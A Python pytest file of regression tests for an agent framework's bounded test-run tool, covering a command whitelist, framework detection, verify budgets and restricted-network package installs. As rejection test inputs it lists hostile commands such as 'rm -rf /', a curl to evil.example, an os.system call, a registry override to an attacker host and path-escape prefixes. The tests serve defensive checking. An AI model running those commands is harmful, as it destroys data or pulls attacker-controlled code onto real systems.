"""Regression tests for TestRunTool — bounded project verification.

Approval posture (GRANTABLE + turn-grantable + cloud withhold) is already pinned in
``test_approvals.py`` / ``test_tools_catalog.py`` — this file covers the execute-path
guards those suites do not: whitelist, framework detection, check modes, and
verify-budget ``contract_failure`` (must not feed the circuit breaker).
"""

from __future__ import annotations

from typing import Any

import pytest

from agentcore.core.types import ToolApproval, ToolCategory
from agentcore.runtime.context.workspace_profile import WorkspaceProfile
from agentcore.tools.builtin.test_run import (
    _ALLOWED_PREFIXES,
    _VERIFY_BUDGET_SECONDS,
    TestRunTool,
    _base_command,
    _detect_framework,
    _is_allowed_command,
    _is_allowed_verify_argv,
    _python_argv_runner,
)
from agentcore.tools.protocol import ToolContext
from agentcore.tools.sandbox.protocol import ExecutionRequest, ExecutionResult
from agentcore.workspace.protocol import PathNotFound


class _FakeBackend:
    """Minimal workspace stub: ``exists`` set controls which paths ``read`` finds."""

    def __init__(
        self,
        exists: set[str] | None = None,
        *,
        result: ExecutionResult | None = None,
        location: str = "server",
    ) -> None:
        self.location = location
        self._exists = exists or set()
        self.requests: list[ExecutionRequest] = []
        self._result = result or ExecutionResult(
            success=True, stdout="1 passed\n", stderr="", exit_code=0, duration_ms=1
        )

    async def read(self, path: str) -> bytes:
        norm = path.replace("\\", "/")
        if norm in self._exists or path in self._exists:
            return b""
        raise PathNotFound(path)

    async def execute(self, request: ExecutionRequest) -> ExecutionResult:
        self.requests.append(request)
        return self._result

    async def index_files(self, *, cap: int = 50, order: str = "recent"):
        return [], 0


def _ctx(backend: _FakeBackend) -> ToolContext:
    return ToolContext(
        execution_id="e",
        run_id="s",
        agent_id="a",
        backend=backend,  # type: ignore[arg-type]
        user_id="u",
    )


def _make_profile(**kwargs: Any) -> WorkspaceProfile:
    defaults: dict[str, Any] = {
        "languages": [],
        "frameworks": [],
        "package_managers": [],
        "test_commands": [],
    }
    defaults.update(kwargs)
    return WorkspaceProfile(**defaults)


# --- approval posture (thin nail; full gate coverage lives in test_approvals) ---


def test_test_run_schema_stays_grantable_execution():
    """P0-1 regression nail: test_run must remain GRANTABLE ∩ EXECUTION."""
    schema = TestRunTool().schema
    assert schema.name == "test_run"
    assert schema.approval is ToolApproval.GRANTABLE
    assert schema.category is ToolCategory.EXECUTION
    assert "有界项目验证" in schema.description
    assert "code_execute" in schema.description
    # Engine ceiling must outlive sandbox budget so Timeout returns as contract_failure.
    assert schema.timeout_seconds is not None
    assert schema.timeout_seconds > _VERIFY_BUDGET_SECONDS


# --- command whitelist ---


def test_allowed_prefixes_cover_supported_runners():
    prefixes = set(_ALLOWED_PREFIXES)
    assert ("pytest",) in prefixes
    assert ("python", "-m", "pytest") in prefixes
    assert ("uv", "run", "pytest") in prefixes
    assert ("npx", "vitest") in prefixes
    assert ("npx", "jest") in prefixes
    assert ("pnpm", "test") in prefixes
    assert ("npm", "test") in prefixes
    assert ("vitest",) in prefixes
    assert ("jest",) in prefixes
    assert ("npx", "tsc") in prefixes
    assert ("npm", "run", "build") in prefixes
    assert ("pnpm", "run", "typecheck") in prefixes
    assert ("npm", "install") in prefixes
    assert ("pnpm", "ci") in prefixes
    assert ("yarn", "install") in prefixes


@pytest.mark.parametrize(
    "argv",
    [
        ["pytest", "--tb=short", "-q"],
        ["python", "-m", "pytest", "-q"],
        ["uv", "run", "pytest", "--tb=short", "-q"],
        ["npx", "vitest", "run"],
        ["npx", "jest"],
        ["pnpm", "test"],
        ["npm", "test", "--", "foo"],
        ["vitest", "run"],
        ["jest", "--coverage"],
        ["npx", "tsc", "--noEmit"],
        ["npm", "run", "build"],
        ["pnpm", "run", "typecheck"],
        ["cargo", "check"],
        ["npm", "install"],
        ["npm", "ci"],
        ["pnpm", "install"],
        ["pnpm", "ci"],
        ["yarn", "install"],
        ["npm", "--prefix", "apps/web", "install"],
        ["pnpm", "--dir", "packages/ui", "install"],
        ["yarn", "--cwd", "frontend", "install"],
    ],
)
def test_is_allowed_command_accepts_whitelisted_prefixes(argv: list[str]):
    assert _is_allowed_command(argv) is True
    assert _is_allowed_verify_argv(argv) is True


@pytest.mark.parametrize(
    "argv",
    [
        [],
        ["bash", "-c", "rm -rf /"],
        ["curl", "https://evil.example"],
        ["python", "-c", "import os; os.system('id')"],
        ["python", "script.py"],  # not ``python -m pytest``
        ["npx", "eslint"],  # npx alone is not enough — must be vitest/jest/tsc
        ["node", "-e", "1"],
        ["sh", "-c", "pytest"],
        ["sudo", "pytest"],
        ["npm", "run", "dev"],  # long-running — not verify
        ["npm", "install", "--registry", "https://evil.example/"],
        ["npm", "--prefix", "../escape", "install"],
        ["npm", "--prefix", "/etc", "install"],
    ],
)
def test_is_allowed_command_rejects_non_whitelisted(argv: list[str]):
    assert _is_allowed_command(argv) is False


def test_base_command_always_produces_allowed_argv():
    for framework in ("pytest", "vitest", "jest"):
        for pm in ([], ["uv"], ["npm"]):
            argv = _base_command(framework, _make_profile(package_managers=pm))  # type: ignore[arg-type]
            assert _is_allowed_command(argv), (framework, pm, argv)


def test_python_argv_runner_embeds_argv_without_bash():
    code = _python_argv_runner(["npx", "tsc", "--noEmit"])
    assert "bash" not in code
    assert "npx" in code
    assert "subprocess.run" in code


async def test_execute_rejects_when_command_leaves_whitelist(
    monkeypatch: pytest.MonkeyPatch,
):
    backend = _FakeBackend(exists={"pyproject.toml"})

    async def _fake_profile(_backend):
        return _make_profile(languages=["python"], test_commands=["pytest"])

    async def _framework(_backend, _prof, _arg):
        return "pytest"

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _fake_profile,
    )
    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run._detect_framework",
        _framework,
    )
    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run._base_command",
        lambda *_a, **_k: ["bash", "-c", "evil"],
    )

    result = await TestRunTool().execute({"scope": "all"}, _ctx(backend))
    assert result.success is False
    assert "白名单" in (result.error or "")
    assert backend.requests == []  # never reached the sandbox
    assert result.contract_failure is True


# --- framework detection ---


async def test_detect_framework_honors_explicit_arg():
    backend = _FakeBackend()
    assert await _detect_framework(backend, _make_profile(), "pytest") == "pytest"
    assert await _detect_framework(backend, _make_profile(), "vitest") == "vitest"
    assert await _detect_framework(backend, _make_profile(), "jest") == "jest"


async def test_detect_framework_from_profile_test_commands():
    backend = _FakeBackend()
    assert (
        await _detect_framework(
            backend, _make_profile(test_commands=["uv run pytest -q"]), "auto"
        )
        == "pytest"
    )
    assert (
        await _detect_framework(
            backend, _make_profile(test_commands=["npx vitest run"]), "auto"
        )
        == "vitest"
    )
    assert (
        await _detect_framework(
            backend, _make_profile(test_commands=["npm test"]), "auto"
        )
        == "jest"
    )


async def test_detect_framework_from_config_files():
    assert (
        await _detect_framework(
            _FakeBackend(exists={"vitest.config.ts"}), _make_profile(), "auto"
        )
        == "vitest"
    )
    assert (
        await _detect_framework(
            _FakeBackend(exists={"jest.config.js"}), _make_profile(), "auto"
        )
        == "jest"
    )
    assert (
        await _detect_framework(
            _FakeBackend(exists={"pyproject.toml"}), _make_profile(), "auto"
        )
        == "pytest"
    )
    assert (
        await _detect_framework(
            _FakeBackend(exists={"package.json"}), _make_profile(), "auto"
        )
        == "jest"
    )


async def test_detect_framework_returns_none_when_unknown():
    assert await _detect_framework(_FakeBackend(), _make_profile(), "auto") is None


async def test_execute_fails_cleanly_when_framework_undetectable(
    monkeypatch: pytest.MonkeyPatch,
):
    backend = _FakeBackend()

    async def _empty_profile(_backend):
        return _make_profile()

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _empty_profile,
    )
    result = await TestRunTool().execute({"scope": "all"}, _ctx(backend))
    assert result.success is False
    assert "无法检测" in (result.error or "")
    assert backend.requests == []
    assert result.contract_failure is True


# --- bounded verify modes ---


async def test_check_command_runs_via_python_launcher(
    monkeypatch: pytest.MonkeyPatch,
):
    backend = _FakeBackend(
        result=ExecutionResult(
            success=True, stdout="", stderr="", exit_code=0, duration_ms=12
        )
    )

    async def _fake_profile(_backend):
        return _make_profile()

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _fake_profile,
    )
    result = await TestRunTool().execute(
        {"check": "command", "command": "npx tsc --noEmit"},
        _ctx(backend),
    )
    assert result.success is True
    assert len(backend.requests) == 1
    req = backend.requests[0]
    assert req.language == "python"
    assert req.timeout_seconds == _VERIFY_BUDGET_SECONDS
    assert "npx" in req.code and "tsc" in req.code
    assert "bash" not in req.code
    assert "## 验证结果：通过" in result.output
    assert result.contract_failure is False


async def test_check_build_uses_profile_build_command(
    monkeypatch: pytest.MonkeyPatch,
):
    backend = _FakeBackend(
        exists={"package.json"},
        result=ExecutionResult(
            success=True, stdout="built\n", stderr="", exit_code=0, duration_ms=20
        ),
    )

    async def _fake_profile(_backend):
        return _make_profile(
            package_managers=["npm"],
            build_commands=["npm run build"],
        )

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _fake_profile,
    )
    result = await TestRunTool().execute({"check": "build"}, _ctx(backend))
    assert result.success is True
    assert "npm" in backend.requests[0].code
    assert "build" in backend.requests[0].code
    assert result.metadata is not None
    assert result.metadata.get("check") == "build"


async def test_verify_budget_timeout_is_contract_failure_not_tool_breakage(
    monkeypatch: pytest.MonkeyPatch,
):
    """超预算 = 验证未完成 → contract_failure；不得当作「工具坏了」进熔断。"""
    backend = _FakeBackend(
        result=ExecutionResult(
            success=False,
            stdout="",
            stderr=f"Timeout: execution exceeded {_VERIFY_BUDGET_SECONDS}s",
            exit_code=-1,
            duration_ms=_VERIFY_BUDGET_SECONDS * 1000,
        )
    )

    async def _fake_profile(_backend):
        return _make_profile()

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _fake_profile,
    )
    result = await TestRunTool().execute(
        {"check": "command", "command": "npm run build"},
        _ctx(backend),
    )
    assert result.success is False
    assert result.contract_failure is True
    assert result.metadata is not None
    assert result.metadata.get("code") == "verify_budget"
    assert "预算" in (result.error or "") or "未完成" in (result.error or "")
    assert "验证结果：未完成" in result.output


async def test_check_command_missing_is_contract_failure():
    result = await TestRunTool().execute({"check": "command"}, _ctx(_FakeBackend()))
    assert result.success is False
    assert result.contract_failure is True
    assert "command" in (result.error or "")


async def test_default_check_test_still_parses_pytest(
    monkeypatch: pytest.MonkeyPatch,
):
    backend = _FakeBackend(
        exists={"pyproject.toml"},
        result=ExecutionResult(
            success=True,
            stdout="2 passed\n",
            stderr="",
            exit_code=0,
            duration_ms=5,
        ),
    )

    async def _fake_profile(_backend):
        return _make_profile(languages=["python"], test_commands=["pytest"])

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _fake_profile,
    )
    result = await TestRunTool().execute({"scope": "all"}, _ctx(backend))
    assert result.success is True
    assert backend.requests[0].language == "python"
    assert "通过" in result.output


def _auto_permission_ctx(backend: _FakeBackend) -> ToolContext:
    return ToolContext(
        execution_id="e",
        run_id="s",
        agent_id="a",
        backend=backend,  # type: ignore[arg-type]
        user_id="u",
        permission_preset='{"file_write":"session","command":"auto","team_kickoff":"rules","host":"ask"}',
    )


async def test_check_install_runs_with_restricted_network_and_registry_pin(
    monkeypatch: pytest.MonkeyPatch,
):
    backend = _FakeBackend(
        exists={"package.json"},
        result=ExecutionResult(
            success=True, stdout="added 1\n", stderr="", exit_code=0, duration_ms=50
        ),
    )

    async def _fake_profile(_backend):
        return _make_profile(package_managers=["npm"])

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _fake_profile,
    )
    monkeypatch.setattr(
        "agentcore.tools.sandbox.egress.registry_egress_available",
        lambda: True,
    )
    result = await TestRunTool().execute({"check": "install"}, _auto_permission_ctx(backend))
    assert result.success is True
    assert len(backend.requests) == 1
    req = backend.requests[0]
    assert req.network_mode == "restricted"
    assert req.registry_egress is True
    assert req.cache_bucket == "u"
    assert req.timeout_seconds == _VERIFY_BUDGET_SECONDS
    assert req.env is not None
    assert "registry.npmjs.org" in (req.env.get("NPM_CONFIG_REGISTRY") or "")
    assert req.env.get("NPM_CONFIG_CACHE", "").startswith("/pkg-cache")
    assert "npm" in req.code and "install" in req.code


async def test_check_install_omits_cache_bucket_without_user_id(
    monkeypatch: pytest.MonkeyPatch,
):
    backend = _FakeBackend(
        exists={"package.json"},
        result=ExecutionResult(
            success=True, stdout="added 1\n", stderr="", exit_code=0, duration_ms=50
        ),
    )

    async def _fake_profile(_backend):
        return _make_profile(package_managers=["npm"])

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _fake_profile,
    )
    monkeypatch.setattr(
        "agentcore.tools.sandbox.egress.registry_egress_available",
        lambda: True,
    )
    ctx = ToolContext(
        execution_id="e",
        run_id="s",
        agent_id="a",
        backend=backend,  # type: ignore[arg-type]
        user_id="",
        permission_preset='{"file_write":"session","command":"auto","team_kickoff":"rules","host":"ask"}',
    )
    result = await TestRunTool().execute({"check": "install"}, ctx)
    assert result.success is True
    assert backend.requests[0].cache_bucket is None


async def test_check_install_rejects_without_restricted_network(
    monkeypatch: pytest.MonkeyPatch,
):
    backend = _FakeBackend(exists={"package.json"})

    async def _fake_profile(_backend):
        return _make_profile(package_managers=["npm"])

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _fake_profile,
    )
    # Default ctx: no permission_preset → network_mode would be none
    result = await TestRunTool().execute({"check": "install"}, _ctx(backend))
    assert result.success is False
    assert result.contract_failure is True
    assert result.metadata is not None
    assert result.metadata.get("code") == "install_network_unavailable"
    assert "无法装包" in (result.error or "")
    assert backend.requests == []


async def test_check_install_rejects_without_egress_chokepoint(
    monkeypatch: pytest.MonkeyPatch,
):
    backend = _FakeBackend(exists={"package.json"})

    async def _fake_profile(_backend):
        return _make_profile(package_managers=["npm"])

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _fake_profile,
    )
    monkeypatch.setattr(
        "agentcore.tools.sandbox.egress.registry_egress_available",
        lambda: False,
    )
    result = await TestRunTool().execute({"check": "install"}, _auto_permission_ctx(backend))
    assert result.success is False
    assert result.contract_failure is True
    assert result.metadata is not None
    assert result.metadata.get("code") == "install_network_unavailable"
    assert backend.requests == []


async def test_check_install_local_skips_host_egress_gate(
    monkeypatch: pytest.MonkeyPatch,
):
    """Local backend must not require API-host gVisor egress availability."""
    backend = _FakeBackend(
        exists={"package.json"},
        location="local",
        result=ExecutionResult(
            success=True, stdout="added 1\n", stderr="", exit_code=0, duration_ms=50
        ),
    )

    async def _fake_profile(_backend):
        return _make_profile(package_managers=["npm"])

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _fake_profile,
    )
    monkeypatch.setattr(
        "agentcore.tools.sandbox.egress.registry_egress_available",
        lambda: False,
    )
    result = await TestRunTool().execute({"check": "install"}, _auto_permission_ctx(backend))
    assert result.success is True
    req = backend.requests[0]
    assert req.registry_egress is False
    assert req.cache_bucket is None
    assert req.env is not None
    assert "registry.npmjs.org" in (req.env.get("NPM_CONFIG_REGISTRY") or "")
    assert "NPM_CONFIG_CACHE" not in req.env


async def test_check_install_local_still_requires_permission(
    monkeypatch: pytest.MonkeyPatch,
):
    backend = _FakeBackend(exists={"package.json"}, location="local")

    async def _fake_profile(_backend):
        return _make_profile(package_managers=["npm"])

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _fake_profile,
    )
    result = await TestRunTool().execute({"check": "install"}, _ctx(backend))
    assert result.success is False
    assert result.contract_failure is True
    assert result.metadata is not None
    assert result.metadata.get("code") == "install_network_unavailable"
    assert backend.requests == []


async def test_command_install_rejects_shell_chain(monkeypatch: pytest.MonkeyPatch):
    backend = _FakeBackend()

    async def _fake_profile(_backend):
        return _make_profile()

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _fake_profile,
    )
    result = await TestRunTool().execute(
        {"check": "command", "command": "cd apps/web && npm install"},
        _auto_permission_ctx(backend),
    )
    assert result.success is False
    assert "shell" in (result.error or "").lower() or "cd" in (result.error or "")
    assert backend.requests == []


async def test_command_install_rejects_registry_override(monkeypatch: pytest.MonkeyPatch):
    backend = _FakeBackend()

    async def _fake_profile(_backend):
        return _make_profile()

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _fake_profile,
    )
    result = await TestRunTool().execute(
        {
            "check": "command",
            "command": "npm install --registry https://evil.example/",
        },
        _auto_permission_ctx(backend),
    )
    assert result.success is False
    assert "包装源" in (result.error or "") or "registry" in (result.error or "").lower()
    assert backend.requests == []


async def test_command_npm_prefix_install_allowed(monkeypatch: pytest.MonkeyPatch):
    backend = _FakeBackend(
        result=ExecutionResult(
            success=True, stdout="", stderr="", exit_code=0, duration_ms=10
        )
    )

    async def _fake_profile(_backend):
        return _make_profile()

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _fake_profile,
    )
    monkeypatch.setattr(
        "agentcore.tools.sandbox.egress.registry_egress_available",
        lambda: True,
    )
    result = await TestRunTool().execute(
        {"check": "command", "command": "npm --prefix apps/web install"},
        _auto_permission_ctx(backend),
    )
    assert result.success is True
    assert backend.requests[0].network_mode == "restricted"
    assert backend.requests[0].registry_egress is True
    assert "--prefix" in backend.requests[0].code


async def test_working_directory_injects_npm_prefix(monkeypatch: pytest.MonkeyPatch):
    backend = _FakeBackend(
        result=ExecutionResult(
            success=True, stdout="", stderr="", exit_code=0, duration_ms=10
        )
    )

    async def _fake_profile(_backend):
        return _make_profile(package_managers=["npm"])

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _fake_profile,
    )
    monkeypatch.setattr(
        "agentcore.tools.sandbox.egress.registry_egress_available",
        lambda: True,
    )
    result = await TestRunTool().execute(
        {"check": "install", "working_directory": "apps/web"},
        _auto_permission_ctx(backend),
    )
    assert result.success is True
    assert "--prefix" in backend.requests[0].code
    assert "apps/web" in backend.requests[0].code


async def test_build_whitelist_unaffected_by_install_rules(
    monkeypatch: pytest.MonkeyPatch,
):
    """既有 build/typecheck 白名单不回归：无网也可跑（不强制 restricted）。"""
    backend = _FakeBackend(
        exists={"package.json"},
        result=ExecutionResult(
            success=True, stdout="built\n", stderr="", exit_code=0, duration_ms=20
        ),
    )

    async def _fake_profile(_backend):
        return _make_profile(
            package_managers=["npm"],
            build_commands=["npm run build"],
        )

    monkeypatch.setattr(
        "agentcore.tools.builtin.test_run.detect_workspace_profile",
        _fake_profile,
    )
    result = await TestRunTool().execute({"check": "build"}, _ctx(backend))
    assert result.success is True
    assert backend.requests[0].network_mode == "none"
